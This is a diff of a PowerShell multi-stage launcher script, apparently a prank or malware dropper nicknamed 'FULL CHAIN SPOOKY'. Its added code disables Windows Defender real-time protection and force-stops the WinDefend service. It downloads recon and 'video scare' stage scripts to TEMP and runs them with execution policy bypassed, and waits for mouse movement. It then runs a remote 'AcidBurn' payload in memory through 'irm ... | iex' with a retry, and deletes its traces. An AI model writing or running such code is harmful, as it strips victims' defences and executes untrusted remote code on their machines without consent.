@@ -1,38 +1,56 @@
-# Set Execution Policy
+# === Set Execution Policy for Session ===
 Set-ExecutionPolicy RemoteSigned -Scope Process -Force
 
-Write-Host "=== Starting Master Launcher (WITH DEFENDER DISABLE) ==="
+Write-Host "=== Starting FULL CHAIN SPOOKY Master Launcher ==="
 
-# ---- DISABLE WINDOWS DEFENDER ----
+# === FUNCTIONS ===
+
+# Try disabling Defender using normal method
 function Disable-Defender {
     try {
         Write-Host "Checking Windows Defender status..."
-
         $defenderStatus = Get-MpPreference
         if ($defenderStatus.DisableRealtimeMonitoring -eq $false) {
             Write-Host "Defender real-time protection is ACTIVE. Attempting to disable..."
-
             Set-MpPreference -DisableRealtimeMonitoring $true
             Write-Host "Defender real-time protection disabled successfully!"
         } else {
             Write-Host "Defender real-time protection is already disabled."
         }
     } catch {
-        Write-Host "Failed to disable Defender. May require Admin rights or is locked by Group Policy."
+        Write-Host "Standard Defender disable failed. Attempting hard disable next..."
     }
 }
 
-# Disable Defender immediately
+# If normal Defender kill fails, attempt aggressive service shutdown
+function Force-DisableDefender {
+    try {
+        Write-Host "Attempting hard disable of Defender services..."
+        Stop-Service -Name "WinDefend" -Force
+        Set-Service -Name "WinDefend" -StartupType Disabled
+        Write-Host "Defender service stopped and disabled!"
+    } catch {
+        Write-Host "Could not force stop Defender service. May require SYSTEM privileges."
+    }
+}
+
+# === BEGIN ===
+
+# First try to disable Defender
 Disable-Defender
 
-# ------------------------------------
+# Then attempt hard disable if needed
+Force-DisableDefender
 
-# Define URLs
+# === DOWNLOAD AND EXECUTE STAGES ===
+
+# Define URLs for stages
 $urls = @(
-    "https://github.com/GTheMans/Scripts/raw/refs/heads/main/Original_Recon", # Part 1
-    "https://github.com/GTheMans/Scripts/raw/refs/heads/main/video_scare.txt"  # Part 2
+    "https://github.com/GTheMans/Scripts/raw/refs/heads/main/Original_Recon", # Part 1 - Recon
+    "https://github.com/GTheMans/Scripts/raw/refs/heads/main/video_scare.txt"  # Part 2 - Video scare
 )
 
+# Define temp paths for parts
 $tempPaths = @(
     "$env:TEMP\part1.ps1",
     "$env:TEMP\part2.ps1"
@@ -50,8 +68,10 @@ for ($i = 0; $i -lt $urls.Count; $i++) {
     }
 }
 
-# Run Part 1
-Write-Host "Running Part 1..."
+# === EXECUTE STAGES ===
+
+# Run Part 1 (Recon script)
+Write-Host "Running Part 1 (Recon)..."
 try {
     $process = Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$($tempPaths[0])`"" -PassThru
     $process.WaitForExit()
@@ -62,17 +82,17 @@ try {
 }
 
 # Wait for mouse movement
-Write-Host "Waiting for mouse movement..."
+Write-Host "Waiting for mouse movement before continuing..."
 Add-Type -AssemblyName System.Windows.Forms
 $initialPosition = [System.Windows.Forms.Cursor]::Position
 do {
     Start-Sleep -Milliseconds 500
     $currentPosition = [System.Windows.Forms.Cursor]::Position
 } while ($initialPosition.X -eq $currentPosition.X -and $initialPosition.Y -eq $currentPosition.Y)
-Write-Host "Mouse movement detected."
+Write-Host "Mouse movement detected. Continuing."
 
-# Run Part 2
-Write-Host "Running Part 2..."
+# Run Part 2 (Video scare)
+Write-Host "Running Part 2 (Video scare)..."
 try {
     $process = Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$($tempPaths[1])`"" -PassThru
     $process.WaitForExit()
@@ -82,24 +102,34 @@ try {
     exit
 }
 
-# Small delay before AcidBurn starts
-Write-Host "Waiting 2 seconds before starting AcidBurn..."
+# Small delay before AcidBurn start
+Write-Host "Waiting 2 seconds before launching AcidBurn..."
 Start-Sleep -Seconds 2
 
-# Launch AcidBurn directly into memory
-Write-Host "Launching AcidBurn script directly from memory..."
+# === Launch AcidBurn In-Memory (With Retry) ===
+
+Write-Host "Launching AcidBurn directly from memory..."
 try {
     irm https://jakoby.lol/zyg | iex
     Write-Host "AcidBurn script launched successfully!"
 } catch {
-    Write-Host "Failed to launch AcidBurn."
+    Write-Host "First attempt to launch AcidBurn failed. Retrying after 3 seconds..."
+    Start-Sleep -Seconds 3
+    try {
+        irm https://jakoby.lol/zyg | iex
+        Write-Host "Second attempt successful!"
+    } catch {
+        Write-Host "Failed to launch AcidBurn even after retry. Skipping."
+    }
 }
 
-# Cleanup Part 1 and Part 2 temp files
-Write-Host "Cleaning up temp files..."
+# === CLEANUP ===
+
+Write-Host "Cleaning up temporary files..."
 foreach ($script in $tempPaths) {
     Remove-Item -Path $script -Force -ErrorAction SilentlyContinue
 }
 
-Write-Host "Master Launcher fully complete. Exiting cleanly."
+Write-Host "All stages completed successfully. Exiting quietly."
+
 exit
